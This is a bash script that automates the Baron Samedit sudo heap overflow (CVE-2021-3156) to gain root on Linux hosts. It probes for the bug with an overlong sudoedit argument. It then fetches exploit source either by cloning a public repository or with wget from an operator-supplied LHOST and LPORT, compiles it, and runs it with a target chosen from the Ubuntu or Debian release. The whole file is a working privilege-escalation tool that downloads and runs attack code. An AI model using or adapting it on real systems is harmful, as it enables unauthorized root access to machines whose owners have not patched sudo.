#!/bin/bash

#Script used for Baron Samedit (aka sudo hax me a sandwhich)

echo -e '\E[31;40m' "Checking if vulnerable"; tput sgr0
sudoedit -s '\' $(python3 -c 'print("A"*1000)') 
echo ""
read -p "Does above say memory corruption? (Y/N): " answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Host is most likely vulnerable, exploit (Y/N): "; tput sgr0
	read -p "Does host have internet access and can use git clone (Y/N): " answer
	if [ $answer = y ] ; then
		git clone https://github.com/blasty/CVE-2021-3156.git
		cd CVE-2021-3156
		make
		lsb_release -a > lsb.txt
		if grep bionic lsb.txt
		then
			echo -e '\E[31;40m' "Host is bionic exploiting now"; tput sgr0
			./sudo-hax-me-a-sandwich 0
		elif grep focal
			then
				echo -e '\E[31;40m' "Host is focal exploiting now"; tput sgr0
				./sudo-hax-me-a-sandwich 1 
		elif grep buster
			then
				echo -e	'\E[31;40m' "Host is buster exploiting now"; tput sgr0
				./sudo-hax-me-a-sandwich 2
		else
			echo -e '\E[31;40m' "Not vulnerable with current lsb version"; tput sgr0
		fi
	else 
		echo -e	'\E[31;40m' "LHOST"; tput sgr0
		read LHOST
		echo -e '\E[31;40m' "LPORT"; tput sgr0
		read LPORT
		echo -e '\E[31;40m' "Start web server on $LHOST on port $LPORT, waiting 15 seconds"; tput sgr0
		sleep 15
		wget http://$LHOST:$LPORT/hax.c
		wget http://$LHOST:$LPORT/lib.c
		wget http://$LHOST:$LPORT/Makefile
		make
		lsb_release -a > lsb.txt
		if grep bionic lsb.txt
		then
			echo -e '\E[31;40m' "Host is bionic exploiting now"; tput sgr0
			./sudo-hax-me-a-sandwich 0
		elif grep focal
			then
				echo -e '\E[31;40m' "Host is focal exploiting now"; tput sgr0
				./sudo-hax-me-a-sandwich 1 
		elif grep buster
			then
				echo -e	'\E[31;40m' "Host is buster exploiting now"; tput sgr0
				./sudo-hax-me-a-sandwich 2
		else
			echo -e '\E[31;40m' "Not vulnerable with current lsb version"; tput sgr0
		fi
	fi
fi
